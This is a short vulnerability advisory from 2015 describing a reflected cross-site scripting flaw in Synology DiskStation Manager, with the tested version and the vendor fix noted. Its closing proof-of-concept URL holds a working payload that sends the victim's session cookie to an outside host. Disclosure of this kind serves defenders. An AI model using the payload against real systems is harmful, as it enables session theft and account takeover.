------------------------------------------------------------------------
Reflected Cross-Site Scripting in Synology DiskStation Manager
------------------------------------------------------------------------
Han Sahin, May 2015

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
A reflected Cross-Site scripting vulnerability was found in Synology
DiskStation Manager. This issue allows attackers to perform a wide
variety of actions, such as stealing victims' session tokens or login
credentials if available, performing arbitrary actions on their behalf
but also performing arbitrary redirects to potential malicious websites.

------------------------------------------------------------------------
Tested version
------------------------------------------------------------------------
This issue was tested on Synology DiskStation Manager version 5.2-5565.

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
Synology reports that this issue has been resolved in DiskStation
Manager version 5.2-5565 Update 1 (2015/05/21).
https://www.synology.com/en-global/releaseNote/DS214play

------------------------------------------------------------------------
Details
------------------------------------------------------------------------
https://www.securify.nl/advisory/SFY20150503/reflected_cross_site_scripting_in_synology_diskstation_manager.html


The following proof of concept demonstrates this issue:
http://<target>:5000/webapi/entry.cgi?compound=%5B{%22api%22%3a%22%3Cimg+src%3dx+onerror%3dthis.src%3d%27https%3a//www.securify.nl/%3fc%3d%27%2bdocument.cookie%3E%22%2c%22method%22%3a%22status%22%2c%22version%22%3a1}%2c{%22api%22%3a%22SYNO.Core.System.Utilization%22%2c%22method%22%3a%22get%22%2c%22version%22%3a1%2c%22type%22%3a%22current%22%2c%22resource%22%3a%5B%22cpu%22%2c%22memory%22%2c%22network%22%5D}%5D&api=SYNO.Entry.Request&method=request&version=1
